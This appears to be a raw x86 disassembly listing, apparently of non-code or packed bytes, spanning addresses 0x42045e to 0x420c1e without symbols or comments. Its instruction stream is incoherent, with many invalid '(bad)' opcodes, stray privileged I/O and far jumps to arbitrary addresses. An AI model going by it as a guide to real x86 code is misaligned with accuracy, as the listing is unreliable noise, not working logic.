  42045e:	popf   
  42045f:	daa    
  420460:	pop    ss
  420461:	push   ecx
  420462:	add    edi,DWORD PTR [ecx-0x7a]
  420465:	xchg   BYTE PTR ds:0xfbafc182,dl
  42046b:	jne    0x420459
  42046d:	out    dx,al
  42046e:	arpl   WORD PTR [eax+0x6d],dx
  420471:	push   ecx
  420472:	add    ah,BYTE PTR [edi+0xa2de084]
  420478:	jbe    0x42049c
  42047a:	scas   al,BYTE PTR es:[edi]
  42047b:	adc    edx,edi
  42047d:	jno    0x42045b
  42047f:	and    edx,edx
  420481:	fadd   QWORD PTR [edx]
  420483:	int3   
  420484:	mov    eax,0xae6d9d25
  420489:	dec    ecx
  42048a:	jge    0x4204a9
  42048c:	fld    QWORD PTR [ecx+eiz*8+0x783d576e]
  420493:	jecxz  0x420504
  420495:	cmp    al,0x18
  420497:	push   ebp
  420498:	scas   al,BYTE PTR es:[edi]
  420499:	push   ebx
  42049a:	fiadd  DWORD PTR [eax+0x693363f3]
  4204a0:	aam    0xb2
  4204a2:	imul   BYTE PTR [ebx]
  4204a4:	xchg   ebp,eax
  4204a5:	pop    ecx
  4204a6:	adc    ebp,ebx
  4204a8:	xchg   esi,eax
  4204a9:	and    al,0xe3
  4204ab:	xor    BYTE PTR [ecx+eax*4-0x18],dl
  4204af:	mov    al,0x7b
  4204b1:	out    dx,eax
  4204b2:	js     0x4204b6
  4204b4:	sbb    esp,edi
  4204b6:	(bad)  
  4204b7:	push   esi
  4204b8:	xchg   BYTE PTR [edx-0x60],ah
  4204bb:	in     al,0x92
  4204bd:	aam    0xca
  4204bf:	sub    eax,DWORD PTR [edi-0x23cfba20]
  4204c5:	in     eax,dx
  4204c6:	imul   DWORD PTR [ecx-0x37]
  4204c9:	xchg   DWORD PTR [edi+eax*1+0x636fa40d],ecx
  4204d0:	mov    esi,DWORD PTR [edx+0x151ece8f]
  4204d6:	jns    0x42053d
  4204d8:	cmp    al,0x1a
  4204da:	pcmpgtd mm5,QWORD PTR [edx-0x6590b27c]
  4204e1:	jg     0x42049d
  4204e3:	and    DWORD PTR [ebp+edi*8-0x846f93d],0xffffff89
  4204eb:	(bad)  
  4204ec:	cmp    edx,DWORD PTR [edx-0x45bef252]
  4204f2:	scas   ax,WORD PTR es:[edi]
  4204f4:	rcl    DWORD PTR [esi],cl
  4204f6:	jecxz  0x420515
  4204f8:	push   0x34
  4204fa:	jo     0x420567
  4204fc:	push   edi
  4204fd:	dec    BYTE PTR [ebp-0x2d]
  420500:	inc    eax
  420501:	nop
  420502:	jle    0x42052d
  420504:	pop    es
  420505:	mov    WORD PTR [esi-0x79],ds
  420508:	cdq    
  420509:	clc    
  42050a:	enter  0x9d13,0xd1
  42050e:	pop    ebp
  42050f:	int3   
  420510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420511:	inc    esi
  420512:	jmp    0xff8c043a
  420517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420518:	daa    
  420519:	adc    BYTE PTR [esi-0x66],0x27
  42051d:	in     eax,dx
  42051e:	imul   eax,DWORD PTR [edx],0xc
  420521:	fcom   DWORD PTR [ebp+ebx*1-0x627952c]
  420528:	and    DWORD PTR [edi+0x26],ebx
  42052b:	push   ss
  42052c:	and    al,0x6e
  42052e:	or     al,BYTE PTR [ebx-0x28]
  420531:	mov    edx,0xec612f89
  420536:	pop    ss
  420537:	outs   dx,BYTE PTR ds:[esi]
  420538:	add    esi,DWORD PTR [edi-0x44f44d60]
  42053e:	xchg   edi,eax
  42053f:	cdq    
  420540:	pop    edi
  420541:	sub    BYTE PTR [edi+0x5c6df6b3],0xf5
  420548:	pop    ecx
  420549:	adc    BYTE PTR [edi],ah
  42054b:	push   edx
  42054c:	jno    0x4205c9
  42054e:	fist   WORD PTR [ebx+ecx*8+0x7ffafd9c]
  420555:	dec    ecx
  420556:	hlt    
  420557:	sar    BYTE PTR [edi+0x6b],cl
  42055a:	dec    esi
  42055b:	or     ebp,ebp
  42055d:	shr    DWORD PTR [ebx-0x4c],0xc6
  420561:	xor    esi,eax
  420563:	mov    esp,0x1475c2ea
  420568:	in     al,0xd2
  42056a:	pushf  
  42056b:	add    DWORD PTR [eax+0x72feceda],eax
  420571:	sbb    cl,dh
  420573:	stos   BYTE PTR es:[edi],al
  420574:	retf   
  420575:	(bad)  
  420576:	idiv   DWORD PTR [eax]
  420578:	add    si,bx
  42057b:	retf   
  42057c:	or     edx,DWORD PTR [edi-0x6a]
  42057f:	hlt    
  420580:	xor    ch,cl
  420582:	add    eax,0xc892a42d
  420587:	xor    ch,BYTE PTR [edi+0x1e]
  42058a:	jge    0x42057f
  42058c:	adc    dl,bl
  42058e:	inc    ecx
  42058f:	repnz mov ebx,0x328e3c46
  420595:	and    al,0x59
  420597:	mov    al,ds:0x437d5072
  42059c:	pop    eax
  42059d:	test   al,0x8a
  42059f:	cmp    BYTE PTR [ebp-0x4f8bcfcd],ah
  4205a5:	adc    bh,BYTE PTR [esi]
  4205a7:	xor    BYTE PTR [eax+edi*1],cl
  4205aa:	sub    ebx,DWORD PTR [edx-0x2b44555f]
  4205b0:	push   cs
  4205b1:	dec    edx
  4205b2:	mov    edi,0xa58ab55a
  4205b7:	push   es
  4205b8:	push   esi
  4205b9:	mov    DWORD PTR [edi],edi
  4205bb:	xchg   esp,eax
  4205bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205bd:	ins    DWORD PTR es:[edi],dx
  4205be:	mov    DWORD PTR ds:0x9671395a,ecx
  4205c4:	js     0x420576
  4205c6:	leave  
  4205c7:	dec    edi
  4205c8:	ins    BYTE PTR es:[edi],dx
  4205c9:	in     eax,dx
  4205ca:	pop    es
  4205cb:	mov    ds:0x46565bda,eax
  4205d0:	adc    DWORD PTR [esp+ebp*1-0x6c3feb63],edx
  4205d7:	jne    0x4205b2
  4205d9:	push   esp
  4205da:	pushf  
  4205db:	aam    0xea
  4205dd:	push   0x9e45edb8
  4205e2:	shl    BYTE PTR [ecx],0x28
  4205e5:	jne    0x4205ac
  4205e7:	pop    ecx
  4205e8:	clc    
  4205e9:	mov    ch,0xe4
  4205eb:	stc    
  4205ec:	and    edi,ebp
  4205ee:	rcl    DWORD PTR [ebp+ebx*2-0x40f56a3b],cl
  4205f5:	xchg   edx,eax
  4205f6:	fs dec ebx
  4205f8:	call   0x53fa:0x10a0cb8e
  4205ff:	push   ss
  420600:	mov    ds:0x338c8f7e,al
  420605:	jbe    0x4205f7
  420607:	in     eax,dx
  420608:	push   ss
  420609:	mov    bh,0x78
  42060b:	and    BYTE PTR [eax],0x40
  42060e:	fdiv   DWORD PTR [ebx]
  420610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420611:	cdq    
  420612:	sbb    ch,ch
  420614:	dec    esp
  420615:	sbb    eax,0xffe54f6a
  42061a:	push   ecx
  42061b:	sti    
  42061c:	jne    0x420640
  42061e:	mov    ecx,DWORD PTR [ebp+0x11]
  420621:	sbb    al,0xcb
  420623:	sbb    bh,BYTE PTR [ebx]
  420625:	mov    ds:0x271389bf,eax
  42062a:	cmp    cl,al
  42062c:	add    dl,BYTE PTR [eax+0x1b]
  42062f:	inc    ecx
  420630:	dec    esp
  420631:	jecxz  0x4205c3
  420633:	or     al,0xa6
  420635:	inc    esp
  420636:	push   ecx
  420637:	loop   0x420639
  420639:	and    al,0x77
  42063b:	pop    eax
  42063c:	leave  
  42063d:	fwait
  42063e:	pop    ecx
  42063f:	adc    dh,0xbb
  420642:	and    ecx,edi
  420644:	(bad)  
  420645:	xor    BYTE PTR [edx+0x3193bec5],bh
  42064b:	je     0x4205f5
  42064d:	and    BYTE PTR [edi],bh
  42064f:	fld    QWORD PTR [ebx+0x55]
  420652:	pop    ds
  420653:	(bad)  
  420655:	push   esp
  420656:	jg     0x4205ff
  420658:	adc    DWORD PTR [esi-0x3a],ecx
  42065b:	sbb    bh,dh
  42065d:	push   ecx
  42065e:	sub    eax,0xb042a3d2
  420663:	ret    
  420664:	adc    BYTE PTR [edx-0x322e0163],bh
  42066a:	pusha  
  42066b:	mov    dh,cl
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	(bad)  
  42066f:	mov    esi,0xba9df263
  420674:	(bad)  
  420675:	mov    gs:0x36b20216,eax
  42067b:	lahf   
  42067c:	push   edi
  42067d:	add    BYTE PTR [esi],cl
  42067f:	lock and DWORD PTR [edi],0xff223a15
  420686:	adc    esi,DWORD PTR [esi+0x6a]
  420689:	(bad)  
  42068a:	adc    al,0x7
  42068c:	or     eax,ebp
  42068e:	xor    eax,0x2ef0f80d
  420693:	ret    
  420694:	adc    ebp,eax
  420696:	xor    edi,ecx
  420698:	cwde   
  420699:	mov    dl,BYTE PTR [edx+0x15d2a941]
  42069f:	bound  ecx,QWORD PTR [esi]
  4206a1:	and    esp,esp
  4206a3:	iret   
  4206a4:	cwde   
  4206a5:	fistp  WORD PTR [edx]
  4206a7:	push   ds
  4206a8:	push   esp
  4206a9:	(bad)  
  4206aa:	div    ch
  4206ac:	jle    0x42066d
  4206ae:	push   cs
  4206af:	lock push ds
  4206b1:	mov    ch,0x7e
  4206b3:	ror    eax,0x76
  4206b6:	mov    ch,0x33
  4206b8:	retf   
  4206b9:	jo     0x420735
  4206bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206bc:	dec    ecx
  4206bd:	(bad)  
  4206be:	sbb    al,0x1e
  4206c0:	mov    edi,0xe2c41def
  4206c5:	add    eax,0xa9693067
  4206ca:	stc    
  4206cb:	outs   dx,DWORD PTR ds:[esi]
  4206cc:	in     al,0x61
  4206ce:	inc    edx
  4206cf:	xchg   ebp,eax
  4206d0:	cmp    ebp,ebp
  4206d2:	mov    cs,WORD PTR [esi-0x14cb539b]
  4206d8:	adc    BYTE PTR [edi+0x7d],bh
  4206db:	xchg   edi,eax
  4206dc:	add    BYTE PTR [esi+0x71d72614],cl
  4206e2:	(bad)  
  4206e4:	inc    ecx
  4206e5:	jmp    0x3261d77
  4206ea:	jl     0x4206cd
  4206ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ed:	adc    eax,0x47f887de
  4206f2:	adc    esp,ebx
  4206f4:	imul   ecx,ecx,0x5aa4577c
  4206fa:	dec    esi
  4206fb:	push   ss
  4206fc:	inc    ebx
  4206fd:	out    dx,al
  4206fe:	mov    DWORD PTR [esi-0x49],0xab80806
  420705:	test   esp,edi
  420707:	jo     0x420705
  420709:	ret    
  42070a:	inc    edx
  42070b:	mov    DWORD PTR [esi-0x56],esi
  42070e:	xor    ebx,DWORD PTR [esp+edi*8]
  420711:	sub    DWORD PTR [ecx+eiz*4-0x5ee90e4],ecx
  420718:	dec    edi
  420719:	pop    ebx
  42071a:	sbb    ebx,0x57
  42071d:	(bad)  [edx+ebp*2]
  420720:	retf   
  420721:	mov    ebp,0x3eb5721a
  420726:	pusha  
  420727:	xor    eax,0x108b5b90
  42072c:	cmp    cl,BYTE PTR [esi+ecx*8-0x5b]
  420730:	scas   eax,DWORD PTR es:[edi]
  420731:	sub    al,0xcc
  420733:	sbb    eax,0x9956f153
  420738:	xor    BYTE PTR [esp+edi*2-0x36c01560],dl
  42073f:	and    edx,DWORD PTR [edi+0x5a92d564]
  420745:	sub    al,0x79
  420747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420748:	or     edi,0xa0c28d22
  42074e:	fdiv   QWORD PTR [eax+0x36d0a560]
  420754:	jo     0x4206fd
  420756:	xor    esi,DWORD PTR [esi]
  420758:	sbb    al,0x7d
  42075a:	int3   
  42075b:	pop    ss
  42075c:	cmp    esi,DWORD PTR [edx+0x54]
  42075f:	and    eax,0x5e322935
  420764:	popa   
  420765:	leave  
  420766:	cs adc eax,eax
  420769:	mov    edx,0xddc9cf34
  42076e:	jmp    0x3fbf5c88
  420773:	jmp    0x7b1b:0xce6c474e
  42077a:	shl    DWORD PTR [ebp+0x7b1fd515],0x72
  420781:	pop    eax
  420782:	mov    WORD PTR [eax],gs
  420784:	jns    0x4207fc
  420786:	mov    edi,0x390cc3e0
  42078b:	xchg   ecx,eax
  42078c:	push   ds
  42078d:	lods   eax,DWORD PTR ds:[esi]
  42078e:	sub    al,0x44
  420790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420791:	or     cl,BYTE PTR [edx-0x54]
  420794:	inc    esi
  420795:	add    al,BYTE PTR [ecx+0x31]
  420798:	xchg   ecx,eax
  420799:	lods   eax,DWORD PTR ds:[esi]
  42079a:	jmp    0x420799
  42079c:	push   ecx
  42079d:	cwde   
  42079e:	cs clc 
  4207a0:	mov    bl,0x6b
  4207a2:	cs sbb eax,0x7686eaf3
  4207a8:	mov    cs,ebx
  4207aa:	dec    eax
  4207ab:	push   esp
  4207ac:	push   ecx
  4207ad:	icebp  
  4207ae:	sti    
  4207af:	out    dx,eax
  4207b0:	(bad)  
  4207b2:	fnstsw WORD PTR [edi+0x45c9df40]
  4207b8:	xor    al,0x2
  4207ba:	mov    dl,0x9d
  4207bc:	adc    eax,0xb3a1c2fd
  4207c1:	out    0xdd,al
  4207c3:	mov    ds:0x7f0ded28,eax
  4207c8:	pop    esi
  4207c9:	out    dx,eax
  4207ca:	pop    ds
  4207cb:	pop    ds
  4207cc:	xchg   DWORD PTR [esi],ecx
  4207ce:	jno    0x4207ac
  4207d0:	add    al,0x83
  4207d2:	imul   edx,DWORD PTR [edi],0xaba4fbe9
  4207d8:	or     DWORD PTR [edx],0x8016295c
  4207de:	loopne 0x4207b0
  4207e0:	inc    ebx
  4207e1:	call   0xa5ac:0xe43c01f
  4207e8:	std    
  4207e9:	xchg   ebp,eax
  4207ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207eb:	push   eax
  4207ec:	ja     0x4207f7
  4207ee:	pop    edx
  4207ef:	in     al,dx
  4207f0:	loop   0x420859
  4207f2:	ins    DWORD PTR es:[edi],dx
  4207f3:	ror    esi,0xd8
  4207f6:	mov    esp,0xdcc3b848
  4207fb:	inc    ebx
  4207fc:	loope  0x42082b
  4207fe:	sahf   
  4207ff:	push   ebx
  420800:	and    DWORD PTR [esi*8-0x539cb9e2],edi
  420807:	jnp    0x420807
  420809:	(bad)  
  42080a:	adc    BYTE PTR [edi+eax*8],bh
  42080d:	imul   edx,DWORD PTR [ebx-0x4],0x0
  420811:	dec    ebp
  420812:	add    edx,ebp
  420814:	ins    BYTE PTR es:[edi],dx
  420815:	outs   dx,DWORD PTR ds:[esi]
  420816:	jg     0x4207d7
  420818:	shl    BYTE PTR [esi-0x45],1
  42081b:	mov    al,ds:0x901ab4d7
  420820:	icebp  
  420821:	push   ss
  420822:	call   0x81c9:0x7b1ca0cb
  420829:	fisubr DWORD PTR [eax]
  42082b:	push   ebp
  42082c:	lea    ebx,[ecx+0x16a7bb48]
  420832:	pop    es
  420833:	push   cs
  420834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420835:	mov    eax,edx
  420837:	rcl    BYTE PTR [ebx],0xec
  42083a:	adc    BYTE PTR [esi+0x7a],dl
  42083d:	test   al,0xf1
  42083f:	dec    esi
  420840:	fcom   QWORD PTR [edx+ecx*1-0x3f]
  420844:	ficom  WORD PTR [eax]
  420846:	repnz (bad) [edx]
  420849:	mov    edi,DWORD PTR [ebx+0x506fe24d]
  42084f:	mov    al,ds:0xe540775a
  420854:	sub    al,0x24
  420856:	clc    
  420857:	or     DWORD PTR [eax+0x15ba9bee],0xf1e591e1
  420861:	pop    esp
  420862:	ins    BYTE PTR es:[edi],dx
  420863:	enter  0xaf9b,0xdd
  420867:	and    eax,0xacd68c9f
  42086c:	push   edi
  42086d:	pop    ecx
  42086e:	dec    ebp
  42086f:	leave  
  420870:	cwde   
  420871:	jmp    0x4208d6
  420873:	cdq    
  420874:	or     dh,BYTE PTR [ebp-0x2d]
  420877:	ret    
  420878:	xchg   esi,eax
  420879:	gs xchg edx,eax
  42087b:	sub    cl,BYTE PTR [eax]
  42087d:	xor    eax,0x33b47409
  420882:	xor    ebx,ebx
  420884:	sub    eax,0xd68806cb
  420889:	dec    eax
  42088a:	jo     0x42083d
  42088c:	shl    esp,cl
  42088e:	jne    0x42082b
  420890:	sub    bh,dl
  420892:	cmp    BYTE PTR [ebp+0x410d8a75],0x78
  420899:	push   0x16
  42089b:	push   es
  42089c:	popf   
  42089d:	mov    ebx,0x2d921c77
  4208a2:	push   esp
  4208a3:	out    0xc,eax
  4208a5:	int    0xb7
  4208a7:	xor    bl,dl
  4208a9:	pop    ds
  4208aa:	fsqrt  
  4208ac:	repnz lea ebp,[edx+ebp*2]
  4208b0:	(bad)  
  4208b1:	stc    
  4208b2:	mov    edx,0x74e4a4e8
  4208b7:	jge    0x420897
  4208b9:	mov    ecx,0x483d9bcd
  4208be:	add    edx,DWORD PTR [ebp-0xa1093cc]
  4208c4:	fist   DWORD PTR [ebp+0xbbaa5ab]
  4208ca:	das    
  4208cb:	int    0xfa
  4208cd:	inc    ebp
  4208ce:	enter  0x2fd,0x1e
  4208d2:	sub    BYTE PTR ds:[ebp-0x29bb2e58],bl
  4208d9:	test   BYTE PTR [ecx],0x97
  4208dc:	dec    ebp
  4208dd:	mul    ecx
  4208df:	(bad)  
  4208e0:	push   esp
  4208e1:	inc    esi
  4208e2:	lds    eax,FWORD PTR [eax+eiz*1-0x68c59069]
  4208e9:	cmp    edx,0xffffffc2
  4208ec:	pop    ds
  4208ed:	add    al,0x89
  4208ef:	aaa    
  4208f0:	or     cl,BYTE PTR [ecx+0x17e92f3d]
  4208f6:	push   ebx
  4208f7:	jae    0x420955
  4208f9:	mov    edx,0xd79fd0e8
  4208fe:	and    DWORD PTR [edi-0x675328a3],eax
  420904:	sub    eax,edx
  420906:	mov    al,0x1a
  420908:	dec    BYTE PTR [ebp-0x60]
  42090b:	test   BYTE PTR [edx-0x2fb1eda8],al
  420911:	xchg   ebx,eax
  420912:	pop    edx
  420913:	and    eax,DWORD PTR [ebx+0x35760e71]
  420919:	retf   0x55b6
  42091c:	push   edi
  42091d:	aas    
  42091e:	sbb    ah,dh
  420920:	call   0x677f3a1
  420925:	pop    ecx
  420926:	pushf  
  420927:	imul   edx,DWORD PTR [esi],0xffffff94
  42092a:	or     cl,BYTE PTR [edx]
  42092c:	outs   dx,BYTE PTR ds:[esi]
  42092d:	fstp   DWORD PTR [esi-0x6e]
  420930:	dec    esp
  420931:	cld    
  420932:	adc    eax,0x9b633be9
  420937:	call   DWORD PTR [edx]
  420939:	test   esp,0xee729ade
  42093f:	jp     0x4209bb
  420941:	xchg   ecx,eax
  420942:	ins    DWORD PTR es:[edi],dx
  420943:	mov    ah,0x77
  420945:	call   0xdab8:0x1c9f3018
  42094c:	push   esi
  42094d:	jle    0x420921
  42094f:	(bad)  
  420950:	fnstsw WORD PTR [edi]
  420952:	ret    0x4cfd
  420955:	xor    eax,0xe526e25a
  42095a:	in     eax,dx
  42095b:	nop
  42095c:	fisubr WORD PTR [edx+edi*2-0x272e53e5]
  420963:	call   0x4f5d4d23
  420968:	inc    edx
  420969:	ja     0x420934
  42096b:	into   
  42096c:	jg     0x4209d5
  42096e:	cld    
  42096f:	pop    ecx
  420970:	or     bl,BYTE PTR [ecx]
  420972:	icebp  
  420973:	push   edx
  420974:	xor    dh,bh
  420976:	clc    
  420977:	inc    ebp
  420978:	push   esp
  420979:	push   esi
  42097a:	std    
  42097b:	sbb    cl,dl
  42097d:	jl     0x42097d
  42097f:	mov    al,ds:0x4e03085f
  420984:	jno    0x420a03
  420986:	mov    BYTE PTR [eax],0x2c
  420989:	repnz in eax,0x15
  42098c:	adc    BYTE PTR [ebx-0x4d4d1c58],0x4b
  420993:	xchg   dh,ch
  420995:	mov    bh,0xef
  420997:	(bad)  
  420998:	fnstsw WORD PTR [ebp*8+0x3b5d7fed]
  42099f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a1:	ss rol edi,1
  4209a4:	inc    esi
  4209a5:	and    edx,DWORD PTR [eax]
  4209a7:	sbb    esi,edi
  4209a9:	dec    esp
  4209aa:	or     bh,bh
  4209ac:	js     0x420983
  4209ae:	mov    DWORD PTR [ecx+0x4834827b],esi
  4209b4:	imul   esp,DWORD PTR [edx],0x39
  4209b7:	sbb    al,0x39
  4209b9:	je     0x420a1d
  4209bb:	dec    esp
  4209bc:	(bad)  
  4209bd:	jmp    0x420977
  4209bf:	sbb    bh,BYTE PTR [ecx+0x63c75d5e]
  4209c5:	push   ebp
  4209c6:	push   esp
  4209c7:	jge    0x420a0b
  4209c9:	ror    dh,cl
  4209cb:	pushf  
  4209cc:	dec    esp
  4209cd:	sub    BYTE PTR ds:0xec213872,dh
  4209d3:	out    0xce,eax
  4209d5:	icebp  
  4209d6:	aas    
  4209d7:	das    
  4209d8:	cmp    eax,esi
  4209da:	mov    edi,0x61aee918
  4209df:	xchg   edi,eax
  4209e0:	xchg   edx,eax
  4209e1:	inc    ecx
  4209e2:	add    esi,edi
  4209e4:	bound  edx,QWORD PTR [ebx-0x67]
  4209e7:	ins    DWORD PTR es:[edi],dx
  4209e8:	iret   
  4209e9:	lahf   
  4209ea:	adc    DWORD PTR ds:0x4461b37,0xffffffa7
  4209f1:	out    dx,eax
  4209f2:	mov    ch,BYTE PTR gs:[eax-0x65]
  4209f6:	push   cs
  4209f7:	mov    esp,0xdc9a5020
  4209fc:	mov    al,0xe2
  4209fe:	in     al,dx
  4209ff:	fadd   DWORD PTR [ebx-0x4b]
  420a02:	push   ds
  420a03:	push   ss
  420a04:	pop    ss
  420a05:	add    al,0xc9
  420a07:	(bad)  
  420a08:	push   eax
  420a09:	and    eax,0x172696e5
  420a0e:	mov    ebx,0xcadce590
  420a13:	push   cs
  420a14:	push   0x27
  420a16:	dec    edi
  420a17:	dec    edi
  420a18:	ror    BYTE PTR [ecx-0x6c],1
  420a1b:	or     DWORD PTR [edx],ebx
  420a1d:	xchg   esp,eax
  420a1e:	(bad)  
  420a1f:	jl     0x420a83
  420a21:	dec    ecx
  420a22:	xor    DWORD PTR [ebx],ebp
  420a24:	cmp    al,0x2b
  420a26:	outs   dx,BYTE PTR ds:[esi]
  420a27:	(bad)  
  420a28:	call   0x95f9:0x6362512c
  420a2f:	imul   ecx,DWORD PTR [ebx],0xfe8595b1
  420a35:	cmp    al,0x58
  420a37:	imul   eax,esp,0xfffffff6
  420a3a:	pusha  
  420a3b:	sti    
  420a3c:	mov    ebx,0x67c58aab
  420a41:	cwde   
  420a42:	loopne 0x4209e5
  420a44:	push   ecx
  420a45:	popf   
  420a46:	and    edx,edi
  420a48:	or     al,0xd4
  420a4a:	loope  0x4209d8
  420a4c:	mov    bl,BYTE PTR [ecx]
  420a4e:	jno    0x420a73
  420a50:	add    dl,dh
  420a52:	pop    esi
  420a53:	add    BYTE PTR [eax],bh
  420a55:	xor    BYTE PTR [eax],dh
  420a57:	xchg   ebp,eax
  420a58:	and    eax,0xad82e3b9
  420a5d:	stos   BYTE PTR es:[edi],al
  420a5e:	into   
  420a5f:	jl     0x420a2f
  420a61:	mov    edi,0xd1bdb16c
  420a66:	add    eax,0x29734822
  420a6b:	and    dh,bh
  420a6d:	sub    al,0x4a
  420a6f:	ins    BYTE PTR es:[edi],dx
  420a70:	inc    eax
  420a71:	mov    al,ds:0x469bb3c5
  420a76:	mov    ds:0xb815f36d,eax
  420a7b:	jp     0x420a41
  420a7d:	jne    0x420a3b
  420a7f:	mov    dh,0xbf
  420a81:	fild   WORD PTR [ecx+esi*4-0x59]
  420a85:	aas    
  420a86:	call   0xec23923f
  420a8b:	shr    DWORD PTR [ebx+0x2e],0x66
  420a8f:	mov    WORD PTR [eax],?
  420a91:	jns    0x420b0c
  420a93:	mov    ecx,0xfa8f1ba9
  420a98:	add    DWORD PTR [ecx],ecx
  420a9a:	call   0xe803f783
  420a9f:	or     cl,bl
  420aa1:	out    0xe8,al
  420aa3:	imul   BYTE PTR [ecx]
  420aa5:	push   0x2cd8f840
  420aaa:	jmp    0x85c9:0xc773ddc6
  420ab1:	xchg   esp,eax
  420ab2:	xchg   esi,eax
  420ab3:	hlt    
  420ab4:	cmp    edi,DWORD PTR [ecx+0x42]
  420ab7:	aad    0xcd
  420ab9:	dec    ecx
  420aba:	sub    al,0x80
  420abc:	jae    0x420b0f
  420abe:	add    edi,esi
  420ac0:	clc    
  420ac1:	shl    BYTE PTR [eax+0x77],1
  420ac4:	dec    ebx
  420ac5:	inc    esi
  420ac6:	icebp  
  420ac7:	sbb    al,0x94
  420ac9:	add    ch,BYTE PTR [esi-0x73023090]
  420acf:	aad    0x42
  420ad1:	popf   
  420ad2:	daa    
  420ad3:	mov    eax,ds:0x6f731819
  420ad8:	pop    eax
  420ad9:	lods   al,BYTE PTR ds:[esi]
  420ada:	loopne 0x420b59
  420adc:	mov    bh,0x4d
  420ade:	clc    
  420adf:	loop   0x420b30
  420ae1:	lock or edi,DWORD PTR [eax]
  420ae4:	push   esp
  420ae5:	sbb    eax,0xb0c624fd
  420aea:	xor    ebx,ebx
  420aec:	bound  esp,QWORD PTR [edi-0x15ba1284]
  420af2:	dec    ebp
  420af3:	jne    0x420b04
  420af5:	imul   ebp,DWORD PTR [esi+0x3e],0x4f9873a0
  420afc:	mov    edi,0x61b57fe9
  420b01:	mov    ds:0xbab077ba,al
  420b06:	sar    ebp,1
  420b08:	lahf   
  420b09:	shl    BYTE PTR [eax],cl
  420b0b:	push   0xdef3d607
  420b10:	mov    BYTE PTR [ebx-0x59],bh
  420b13:	repnz xor edi,esi
  420b16:	pop    esi
  420b17:	jnp    0x420add
  420b19:	or     eax,0x67d704dc
  420b1e:	std    
  420b1f:	std    
  420b20:	imul   esp,DWORD PTR [eax+0x4],0xffffffb0
  420b24:	sbb    BYTE PTR [ebx+0xc476afe],ah
  420b2a:	dec    edx
  420b2b:	dec    edx
  420b2c:	xchg   DWORD PTR [esi+0x69],ecx
  420b2f:	and    ebp,DWORD PTR [ebx+0x62680802]
  420b35:	sbb    ah,BYTE PTR [edx+edx*1]
  420b38:	xchg   BYTE PTR [ebx],dl
  420b3a:	ss js  0x420b4a
  420b3d:	dec    ebx
  420b3e:	xor    BYTE PTR [edi],al
  420b40:	call   0x7cfe2428
  420b45:	fs push 0x73
  420b48:	(bad)  
  420b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b4a:	mov    edi,0x675a032d
  420b4f:	xchg   edx,eax
  420b50:	adc    DWORD PTR [edx+0x51df8196],eax
  420b56:	and    eax,0x5d9e2575
  420b5b:	mov    ecx,0x68cd990a
  420b60:	dec    edx
  420b61:	fmul   QWORD PTR fs:[esi]
  420b64:	sar    bl,0x37
  420b67:	xor    eax,0xa66cd86a
  420b6c:	jp     0x420b96
  420b6e:	xor    BYTE PTR [eax-0x613f2541],ch
  420b74:	rcr    ebp,1
  420b76:	sub    edx,DWORD PTR [eax]
  420b78:	jns    0x420b39
  420b7a:	outs   dx,BYTE PTR ds:[esi]
  420b7b:	enter  0xd0,0xfd
  420b7f:	ror    esp,1
  420b81:	mov    ds:0x86e653f6,eax
  420b86:	cs fwait
  420b88:	std    
  420b89:	jno    0x420b45
  420b8b:	push   edx
  420b8c:	fcomp  QWORD PTR [ebp+0x30]
  420b8f:	mov    al,ds:0xe38d82a3
  420b94:	xor    DWORD PTR [edi-0x28],edx
  420b97:	iret   
  420b98:	adc    ch,BYTE PTR [edi+0x3d]
  420b9b:	dec    ebx
  420b9c:	fdiv   QWORD PTR [edi+edx*8+0x1a]
  420ba0:	cmp    eax,0xfd27dcc5
  420ba5:	shr    BYTE PTR [edx+0x533c3510],0x90
  420bac:	js     0x420ba0
  420bae:	(bad)  
  420baf:	xor    eax,0xf7215969
  420bb4:	rol    BYTE PTR [ebx-0x6b56a863],1
  420bba:	jmp    0x420b94
  420bbc:	push   ebx
  420bbd:	(bad)  
  420bbf:	in     al,dx
  420bc0:	jae    0x420bdc
  420bc2:	(bad)  
  420bc3:	rol    esp,cl
  420bc5:	out    0x41,eax
  420bc7:	mov    eax,0xd81b0564
  420bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bcd:	sbb    eax,0x9dd65bea
  420bd2:	dec    edx
  420bd3:	ins    DWORD PTR es:[edi],dx
  420bd4:	iret   
  420bd5:	or     ecx,DWORD PTR [edi-0x207012bc]
  420bdb:	pusha  
  420bdc:	data16 jns 0x420c17
  420bdf:	dec    ebx
  420be0:	dec    ebp
  420be1:	lahf   
  420be2:	sbb    ebx,DWORD PTR [edi]
  420be4:	iret   
  420be5:	add    eax,0xcf045beb
  420bea:	xchg   ebp,eax
  420beb:	pop    ebx
  420bec:	cmp    bl,BYTE PTR [ebp+0x1a5133e0]
  420bf2:	jecxz  0x420bc8
  420bf4:	daa    
  420bf5:	inc    ebp
  420bf6:	aaa    
  420bf7:	ins    BYTE PTR es:[edi],dx
  420bf8:	push   eax
  420bf9:	lahf   
  420bfa:	div    DWORD PTR [edx]
  420bfc:	and    dl,BYTE PTR [esi]
  420bfe:	repnz aas 
  420c00:	fmul   st(4),st
  420c02:	push   edx
  420c03:	dec    eax
  420c04:	imul   edi,DWORD PTR [ebx-0x50bd3a2f],0x874b4379
  420c0e:	xchg   ebx,edi
  420c10:	in     al,dx
  420c11:	(bad)  
  420c12:	xchg   esp,eax
  420c13:	sub    esp,DWORD PTR [edi-0x63]
  420c16:	lods   al,BYTE PTR ds:[esi]
  420c17:	stos   BYTE PTR es:[edi],al
  420c18:	ret    
  420c19:	js     0x420bb5
  420c1b:	fmul   QWORD PTR [ecx-0x61]
  420c1e:	mov    BYTE PTR [esi],ah
